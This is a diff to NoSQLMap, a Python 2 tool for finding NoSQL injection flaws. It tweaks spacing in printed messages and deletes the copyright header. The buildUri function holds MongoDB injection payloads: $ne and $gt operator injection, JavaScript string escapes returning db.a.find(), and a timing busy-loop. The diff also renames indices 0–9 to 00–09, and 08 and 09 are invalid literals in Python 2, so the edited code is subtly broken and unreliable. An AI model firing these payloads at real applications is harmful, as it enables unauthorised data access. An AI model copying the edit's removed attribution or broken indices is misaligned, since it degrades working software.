@@ -1,5 +1,4 @@
 #!/usr/bin/python
-# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
 # See the file 'doc/COPYING' for copying permission
 
 
@@ -543,7 +542,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         body = urllib.urlencode(gtDict)
         req = urllib2.Request(appURL,body, requestHeaders)
         if verb == "ON":
-            print "Testing PHP/ExpressJS >Undefined Injection using " + str(postData) + "..."
+            print "Testing PHP / ExpressJS >Undefined Injection using " + str(postData) + "..."
 
         else:
             print "Test 2:  PHP/ExpressJS > Undefined Injection"
@@ -600,7 +599,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         body = urllib.urlencode(postData)
         req = urllib2.Request(appURL,body, requestHeaders)
         if verb == "ON":
-            print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
+            print "Testing Mongo < 2.4 $where all Javascript string escape attack for one record...\n"
             print " Injecting " + str(postData)
 
         else:
@@ -727,7 +726,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
                 intTbAttack = False
 
         print "\n"
-        print "Exploitable requests:"
+        print "Exploitable Requests:"
         print "\n".join(vulnAddrs)
         print "\n"
         print "Possibly vulnerable requests:"
@@ -853,7 +852,7 @@ def checkResult(baseSize,respSize,testNum,verb,postData):
 
     else:
         if verb == "ON":
-            print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+            print "Injected response was smaller than random response. Injection may have worked but requires verification."
         else:
             print "Possible injection."
         if httpMethod == "GET":
@@ -949,16 +948,16 @@ def buildUri(origUri, randValue, args=None):
     for item in paramName:
 
         if paramName[x] in injOpt:
-            uriArray[0] += paramName[x] + "=" + randValue + "&"
-            uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
-            uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
-            uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
-            uriArray[4] += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
-            uriArray[5] += paramName[x] + "=1; return db.a.findOne(); var dummy=1" + "&"
-            uriArray[6] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
-            uriArray[7] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
-            uriArray[8] += paramName[x] + "[$gt]=&"
-            uriArray[9] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
+            uriArray[00] += paramName[x] + "=" + randValue + "&"
+            uriArray[01] += paramName[x] + "[$ne]=" + randValue + "&"
+            uriArray[02] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
+            uriArray[03] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
+            uriArray[04] += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
+            uriArray[05] += paramName[x] + "=1; return db.a.findOne(); var dummy=1" + "&"
+            uriArray[06] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
+            uriArray[07] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
+            uriArray[08] += paramName[x] + "[$gt]=&"
+            uriArray[09] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
             uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy='!" + "&"
             uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
             uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
@@ -971,16 +970,16 @@ def buildUri(origUri, randValue, args=None):
             uriArray[18] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
 
         else:
-            uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[1] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[2] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[3] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[4] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[5] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[6] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[7] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[8] += paramName[x] + "=" + paramValue[x] + "&"
-            uriArray[9] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[00] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[01] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[02] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[03] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[04] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[05] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[06] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[07] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[08] += paramName[x] + "=" + paramValue[x] + "&"
+            uriArray[09] += paramName[x] + "=" + paramValue[x] + "&"
             uriArray[10] += paramName[x] + "=" + paramValue[x] + "&"
             uriArray[11] += paramName[x] + "=" + paramValue[x] + "&"
             uriArray[12] += paramName[x] + "=" + paramValue[x] + "&"
